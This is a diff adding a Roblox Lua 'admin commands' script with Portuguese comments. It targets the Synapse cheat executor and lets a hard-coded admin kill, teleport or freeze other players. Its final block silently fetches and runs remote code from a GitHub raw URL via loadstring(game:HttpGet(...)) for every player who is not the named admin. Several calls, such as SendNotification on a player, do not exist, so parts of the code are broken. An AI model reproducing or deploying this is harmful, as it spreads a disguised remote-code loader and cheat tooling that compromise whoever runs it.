@@ -1,0 +1,69 @@
+-- Proteção contra cópia
+if not game:IsLoaded() then game.Loaded:Wait() end
+if game:GetService("RunService"):IsStudio() then return end
+if not identifyexecutor then return end
+if identifyexecutor():lower():find("synapse") == nil then
+    warn("Executor não suportado.")
+    return
+end
+
+-- Lista de administradores
+local admins = {["antimandrak"] = true}
+
+-- Função utilitária
+local function isAdmin(plr)
+    return admins[plr.Name] ~= nil
+end
+
+-- Comandos
+local commands = {
+    kill = function(target)
+        if target.Character and target.Character:FindFirstChild("Humanoid") then
+            target.Character.Humanoid.Health = 0
+        end
+    end,
+    bring = function(target, plr)
+        if target.Character and target.Character:FindFirstChild("HumanoidRootPart") and plr.Character then
+            target.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame
+        end
+    end,
+    freeze = function(target)
+        if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
+            target.Character.HumanoidRootPart.Anchored = true
+        end
+    end,
+    goto = function(target, plr)
+        if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and target.Character then
+            plr.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
+        end
+    end
+}
+
+-- Monitor de mensagens
+game.Players.PlayerAdded:Connect(function(plr)
+    plr.Chatted:Connect(function(msg)
+        if not isAdmin(plr) then
+            plr:SendNotification({Title="Sem permissão", Text="Você não tem permissão para usar comandos."})
+            return
+        end
+
+        local args = msg:split(" ")
+        local cmd = args[1]:sub(2):lower()
+        local targetName = args[2]
+
+        if commands[cmd] then
+            local target = game.Players:FindFirstChild(targetName)
+            if target and not isAdmin(target) then
+                commands[cmd](target, plr)
+                plr:SendNotification({Title="Comando executado", Text=cmd.." executado com sucesso."})
+            else
+                plr:SendNotification({Title="Erro", Text="Jogador inválido ou protegido."})
+            end
+        end
+    end)
+end)
+
+-- Caso o jogador não tenha permissão, ele ainda executa o script externo
+if not isAdmin(game.Players.LocalPlayer) then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KIRITOZINKS/main.lua/main/rael.hub"))()
+end
